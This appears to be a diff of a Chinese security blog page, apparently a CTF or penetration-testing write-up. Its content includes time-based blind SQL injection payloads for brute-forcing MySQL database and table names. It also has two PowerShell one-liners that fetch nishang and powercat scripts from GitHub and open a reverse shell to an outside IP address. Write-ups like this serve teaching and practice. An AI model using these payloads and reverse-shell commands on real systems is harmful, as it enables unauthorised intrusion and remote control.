@@ -70,7 +70,7 @@
     <!-- rss -->
     
     
-<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
 </head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -196,6 +196,7 @@
 <p>没有回显的就常规盲注、时间盲注</p>
 <p>常用函数和语句</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">benchmark(50000000,md5(1212))</span><br><span class="line">case xxx then yyy else zzz end xxx 等于 if(xxx, yyy, zzz)</span><br><span class="line">如果&quot;&lt;&quot;或者&quot;&gt;&quot;被禁止了，则使用 greatest(xxx, 64)&#x3D;64</span><br><span class="line">1\%&#39; AND if(length(database())&#x3D;7,benchmark(10000000,md5(0x41)),1) AND &#39;\%&#39;&#x3D;&#39;</span><br></pre></td></tr></table></figure>
+
 <p>爆破数据库名字：<code>1\%&#39; AND if(ascii(mid(database(),4,1))=121,benchmark(10000000,md5(0x41)),1) AND &#39;\%&#39;=&#39;</code></p>
 <p>爆破表名字：<code>1\%&#39; AND if(ascii(mid((select+table_name from information_schema.tables where table_schema=&#39;mysql&#39; limit 0,1),1,1))=99,1,benchmark(10000000,md5(0x41))) AND &#39;\%&#39;=&#39;</code></p>
 <p>其中 mysql 是数据库名字</p>
@@ -207,6 +208,7 @@
 <p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20201121143838.png" alt="D roomtype. ooL gK 6owgeo"></p>
 <p>然后用蚁剑连接，接着反弹 shell 整一个☝️。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 106.12.88.124 -port 6666</span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;); powercat -c 106.12.88.124 -p 6666 -e cmd</span><br></pre></td></tr></table></figure>
+
 
 
 <p>为什么这里要用反弹 shell 呢？因为 webshell 是非交互式 shell，反弹的 shell 是交互式的 shell。请看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/redwand/article/details/105791548">https://blog.csdn.net/redwand/article/details/105791548</a></p>
